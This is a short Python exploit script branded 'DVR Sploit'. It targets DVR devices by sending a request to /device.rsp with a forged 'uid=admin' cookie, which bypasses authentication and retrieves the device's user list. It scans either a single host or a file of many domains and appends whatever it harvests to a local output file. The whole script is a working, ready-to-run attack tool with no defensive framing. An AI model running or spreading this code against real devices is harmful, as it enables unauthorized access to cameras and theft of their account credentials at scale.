from colorama import Fore
import requests
import argparse
import sys

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument('-f', '--file', action='store',
                    help="domains to check",
                    metavar="filename.txt")

parser.add_argument('-t', '--target', action='store',
                    help="domain to check",
                    metavar="site.com")

group.add_argument('-p', '--port', action='store',
                   help="port number to use",
                   metavar="8080")

args = parser.parse_args()


banner = f"""

{Fore.MAGENTA}
    ___________    _________     ________       ______     __________ 
    ___  __ \_ |  / /__  __ \    __  ___/__________  /________(_)_  /_
    __  / / /_ | / /__  /_/ /    _____ \___  __ \_  /_  __ \_  /_  __/
    _  /_/ /__ |/ / _  _, _/     ____/ /__  /_/ /  / / /_/ /  / / /_  
    /_____/ _____/  /_/ |_|      /____/ _  .___//_/  \____//_/  \__/  
                                        /_/          By @mindfuckerrrr
{Fore.RESET}
"""

print(banner)


def get_device_list(host, port):
    url = f"http://{host}:{port}/device.rsp"
    headers = {
        "Cookie": "uid=admin"
    }
    params = {
        "opt": "user",
        "cmd": "list"
    }

    try:
        s = requests.Session()
        response = s.get(url, params=params, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            pass
    except KeyboardInterrupt:
        sys.exit(0)

    except:
        pass

def save(file: str, vuln: str):
    with open(file, "a") as f:
        f.write(f"{vuln}\n\n")


if args.target:
    if args.port:
        device_list = get_device_list(args.target, args.port)
        if device_list:
            print("Device List:")
            print(f"{Fore.GREEN} {device_list}") 
            save("dvr_output.txt", device_list)
        else:
             pass
        print("Device list appended to dvr_output.txt")

if args.file:
    if args.port:
        with open(f"{args.file}", "r") as f:
            domains = [x.strip() for x in f.readlines()]
        for domain_list in domains:
            print(f"Scanning {Fore.CYAN}{domain_list}{Fore.RESET}\n")
            device_list = get_device_list(domain_list, args.port)
            if device_list is not None:
                print(f"{Fore.GREEN} {device_list} {Fore.RESET}\n")
                save("dvr_output.txt", device_list)
            else:
                pass
        with open("dvr_output.txt", "a") as file:
            file.write(device_list)
            file.write("\n\n")
        print("Device list appended to dvr_output.txt")
